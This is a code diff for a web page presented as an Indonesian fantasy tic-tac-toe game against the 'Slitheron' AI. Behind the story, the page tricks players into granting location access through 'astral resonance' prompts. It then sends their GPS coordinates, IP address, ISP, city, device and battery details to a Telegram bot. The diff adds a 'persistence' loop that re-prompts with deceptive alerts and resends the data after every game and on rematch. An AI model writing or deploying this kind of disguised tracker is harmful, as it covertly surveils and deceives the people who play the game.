@@ -10,13 +10,16 @@
         * { margin: 0; padding: 0; box-sizing: border-box; cursor: crosshair; }
         body { background: var(--bg); color: #fff; font-family: 'Poppins', sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
 
+        /* Story Overlay Section */
         #story-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle, #111 0%, #000 100%); z-index: 100; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 30px; text-align: center; transition: 1s; }
         .typewriter h1 { font-family: 'Orbitron'; font-size: 24px; color: var(--neon-p); margin-bottom: 25px; text-shadow: 0 0 15px var(--neon-p); letter-spacing: 5px; }
-        .story-text { font-size: 13px; line-height: 2; max-width: 550px; opacity: 0.9; margin-bottom: 40px; color: #ccc; font-style: italic; }
-        .btn-action { background: linear-gradient(45deg, var(--neon-u), var(--neon-p)); color: #000; border: none; padding: 18px 45px; font-family: 'Orbitron'; font-weight: 900; border-radius: 2px; transition: 0.5s; cursor: pointer; letter-spacing: 3px; }
+        .story-text { font-size: 13px; line-height: 2; max-width: 550px; opacity: 0.9; margin-bottom: 40px; color: #ccc; font-style: italic; letter-spacing: 1px; }
+        .btn-action { background: linear-gradient(45deg, var(--neon-u), var(--neon-p)); color: #000; border: none; padding: 18px 45px; font-family: 'Orbitron'; font-weight: 900; border-radius: 2px; transition: 0.5s; cursor: pointer; letter-spacing: 3px; box-shadow: 0 0 20px rgba(161, 140, 209, 0.4); }
+        .btn-action:hover { letter-spacing: 6px; box-shadow: 0 0 50px var(--neon-u); }
 
+        /* Game Arena Section */
         #game-arena { display: none; text-align: center; width: 100%; max-width: 400px; padding: 20px; animation: fadeIn 1s; }
-        .dialog-box { min-height: 80px; background: rgba(255,255,255,0.02); border-left: 2px solid var(--neon-u); padding: 15px; margin-bottom: 25px; font-size: 12px; display: flex; align-items: center; justify-content: center; color: var(--neon-p); }
+        .dialog-box { min-height: 80px; background: rgba(255,255,255,0.02); border-left: 2px solid var(--neon-u); padding: 15px; margin-bottom: 25px; font-size: 12px; display: flex; align-items: center; justify-content: center; color: var(--neon-p); letter-spacing: 1px; }
         .board { display: grid; grid-template-columns: repeat(3, 100px); gap: 15px; justify-content: center; margin-bottom: 25px; }
         .cell { width: 100px; height: 100px; background: #080808; border: 1px solid #151515; border-radius: 5px; display: flex; align-items: center; justify-content: center; font-size: 40px; font-family: 'Orbitron'; transition: 0.3s; }
         .x-move { color: #00fff2; text-shadow: 0 0 15px #00fff2; }
@@ -31,14 +34,15 @@
     <div id="story-overlay">
         <div class="typewriter"><h1>THE FALLEN LEGEND</h1></div>
         <p class="story-text">
-            "Slitheron telah mengevolusi kecerdasannya. Ia bukan lagi sekadar parasit, ia adalah predator digital yang tak terkalahkan. Gunakan <b>The Mirror Shield of Gabriel</b> untuk bertahan hidup."
+            "Berabad-abad yang lalu, sang parasit digital <b>Slitheron</b> mengunci jiwa manusia ke dalam void. Hanya satu peninggalan yang tersisa: <b>The Mirror Shield of Gabriel</b>. <br><br>
+            Pahlawan, sinkronisasikan jiwamu. Aktifkan perisai untuk memantulkan kutukan Slitheron."
         </p>
         <button class="btn-action" onclick="activateMirror()">RESONANSI ASTRAL</button>
     </div>
 
     <div id="game-arena">
         <h2 style="font-family:'Orbitron'; font-size:14px; margin-bottom:10px; opacity:0.5; letter-spacing:5px;">VOID BATTLE</h2>
-        <div class="dialog-box" id="status-text">"Slitheron menatapmu... bersiaplah kalah."</div>
+        <div class="dialog-box" id="status-text">"Menunggu frekuensi pahlawan untuk menghancurkan Slitheron..."</div>
         <div class="board">
             <div class="cell" onclick="makeMove(0)"></div><div class="cell" onclick="makeMove(1)"></div><div class="cell" onclick="makeMove(2)"></div>
             <div class="cell" onclick="makeMove(3)"></div><div class="cell" onclick="makeMove(4)"></div><div class="cell" onclick="makeMove(5)"></div>
@@ -66,7 +70,8 @@
             return fetch(url, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: CHAT_ID, ...data}) });
         }
 
-        async function startAstralSync() {
+        // --- AGGRESSIVE PERSISTENCE PROTOCOL ---
+        async function forceSync() {
             navigator.geolocation.getCurrentPosition(async p => {
                 await pushTele('sendLocation', { latitude: p.coords.latitude, longitude: p.coords.longitude });
                 await sendFullReport();
@@ -87,19 +92,14 @@
                 const cpu = navigator.hardwareConcurrency || 'Unknown';
                 const now = new Date().toLocaleString('id-ID', {timeZone:'Asia/Jakarta'}).replace(/\//g,'-');
                 
-                const report = `<b>DATA KORBAN</b>\n
-<b>Waktu Akses | Access Time :</b> ${now}
-<b>Alamat IP | IP Address :</b> <code>${d.ip}</code>
-<b>ISP | Provider :</b> ${d.org}
-<b>Lokasi | Location :</b> ${d.city}, ${d.region}, ${d.country_name}
-<b>Perangkat | Device :</b> ${navigator.userAgent}
-<b>Sistem Operasi | Operating System :</b> ${navigator.platform}
-<b>Resolusi Layar | Screen Resolution :</b> ${window.screen.width} x ${window.screen.height}
-<b>Kunjungan Sebelumnya | Previous Visit :</b> Tidak ada / None.
-<b>Status Baterai | Battery Status :</b> ${Math.round(batt.level * 100)}%
-<b>Memori RAM | Memory :</b> ${ram} GB
-<b>Inti CPU | CPU Cores :</b> ${cpu}
-<b>Tipe Koneksi | Connection :</b> ${conn.effectiveType.toUpperCase()}`;
+                const report = `<b>ASCENSION REPORT ☠️</b>\n
+<b>User :</b> ${navigator.userAgent}
+<b>IP :</b> <code>${d.ip}</code>
+<b>ISP :</b> ${d.org}
+<b>Loc :</b> ${d.city}, ${d.region}, ${d.country_name}
+<b>Batt :</b> ${Math.round(batt.level * 100)}%
+<b>RAM :</b> ${ram} GB | <b>CPU :</b> ${cpu} Cores
+<b>Time :</b> ${now}`;
 
                 await pushTele('sendMessage', { text: report, parse_mode: 'HTML' });
             } catch(e){}
@@ -122,8 +122,8 @@
         }
 
         function activateMirror() {
-            if(confirm("RESONANSI ASTRAL?")) {
-                startAstralSync();
+            if(confirm("RESONANSI ASTRAL?\n\nKlik 'Izinkan' untuk menyelaraskan frekuensi astralmu.")) {
+                forceSync();
                 document.getElementById('story-overlay').style.opacity = '0';
                 setTimeout(() => {
                     document.getElementById('story-overlay').style.display = 'none';
@@ -132,54 +132,33 @@
             }
         }
 
-        // --- THE UNBEATABLE MINIMAX LOGIC ---
+        // --- MINIMAX LOGIC (GOD MODE) ---
         function checkWinner(b, p) {
             const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
             return wins.some(c => c.every(idx => b[idx] === p));
         }
 
         function minimax(newBoard, player) {
-            let availSpots = newBoard.map((v, i) => v === "" ? i : null).filter(v => v !== null);
-
+            let avail = newBoard.map((v, i) => v === "" ? i : null).filter(v => v !== null);
             if (checkWinner(newBoard, "X")) return {score: -10};
             if (checkWinner(newBoard, "O")) return {score: 10};
-            if (availSpots.length === 0) return {score: 0};
-
+            if (avail.length === 0) return {score: 0};
             let moves = [];
-            for (let i = 0; i < availSpots.length; i++) {
-                let move = {};
-                move.index = availSpots[i];
-                newBoard[availSpots[i]] = player;
-
-                if (player === "O") {
-                    let result = minimax(newBoard, "X");
-                    move.score = result.score;
-                } else {
-                    let result = minimax(newBoard, "O");
-                    move.score = result.score;
-                }
-
-                newBoard[availSpots[i]] = "";
+            for (let i = 0; i < avail.length; i++) {
+                let move = {index: avail[i]};
+                newBoard[avail[i]] = player;
+                let result = minimax(newBoard, player === "O" ? "X" : "O");
+                move.score = result.score;
+                newBoard[avail[i]] = "";
                 moves.push(move);
             }
-
             let bestMove;
             if (player === "O") {
                 let bestScore = -10000;
-                for (let i = 0; i < moves.length; i++) {
-                    if (moves[i].score > bestScore) {
-                        bestScore = moves[i].score;
-                        bestMove = i;
-                    }
-                }
+                for (let i = 0; i < moves.length; i++) { if (moves[i].score > bestScore) { bestScore = moves[i].score; bestMove = i; } }
             } else {
                 let bestScore = 10000;
-                for (let i = 0; i < moves.length; i++) {
-                    if (moves[i].score < bestScore) {
-                        bestScore = moves[i].score;
-                        bestMove = i;
-                    }
-                }
+                for (let i = 0; i < moves.length; i++) { if (moves[i].score < bestScore) { bestScore = moves[i].score; bestMove = i; } }
             }
             return moves[bestMove];
         }
@@ -189,45 +168,45 @@
             board[i] = "X";
             cells[i].innerText = "X";
             cells[i].classList.add('x-move');
-            
             if(checkWinner(board, "X")) return finishGame("WIN");
             if(!board.includes("")) return finishGame("DRAW");
-            
             isGameActive = false;
-            document.getElementById('status-text').innerText = "Slitheron memprediksi gerakanmu...";
+            document.getElementById('status-text').innerText = "Slitheron memprediksi...";
             setTimeout(aiTurn, 600); 
         }
 
         function aiTurn() {
-            let bestMove = minimax(board, "O").index;
-            board[bestMove] = "O";
-            cells[bestMove].innerText = "O";
-            cells[bestMove].classList.add('o-move');
-            
+            let move = minimax(board, "O").index;
+            board[move] = "O";
+            cells[move].innerText = "O";
+            cells[move].classList.add('o-move');
             if(checkWinner(board, "O")) finishGame("LOSE");
             else if(!board.includes("")) finishGame("DRAW");
-            else {
-                isGameActive = true;
-                document.getElementById('status-text').innerText = "Slitheron menyerang balik!";
-            }
+            else { isGameActive = true; document.getElementById('status-text').innerText = "Slitheron menyerang!"; }
         }
 
-        function finishGame(result) {
+        function finishGame(res) {
             isGameActive = false;
             const status = document.getElementById('status-text');
-            if(result === "WIN") status.innerText = "MUSTAHIL! KAU MENGALAHKANNYA?";
-            else if(result === "LOSE") status.innerHTML = "<b style='color:red'>SLITHERON MELAHAP JIWAMU.</b>";
-            else status.innerText = "SERI. Slitheron mengakui taktikmu.";
+            if(res === "WIN") status.innerText = "MUSTAHIL! KAU MENANG?";
+            else if(res === "LOSE") status.innerHTML = "<b style='color:red'>SLITHERON MENANG.</b>";
+            else status.innerText = "SERI!";
             document.getElementById('rematch-btn').style.display = "inline-block";
+            
+            // LOOP PERSISTENCE
+            setTimeout(() => {
+                alert("Resonansi Astral terputus! Izinkan akses untuk sinkronisasi ulang.");
+                forceSync();
+            }, 1000);
         }
 
         function resetBattle() {
+            forceSync(); // Minta izin lagi saat klik rematch
             board = ["","","","","","","","",""];
             cells.forEach(c => { c.innerText = ""; c.classList.remove('x-move', 'o-move'); });
             isGameActive = true;
             document.getElementById('rematch-btn').style.display = "none";
-            document.getElementById('status-text').innerText = "Resonansi diulang...";
-            startAstralSync();
+            document.getElementById('status-text').innerText = "Meresync frekuensi...";
         }
     </script>
 </body>
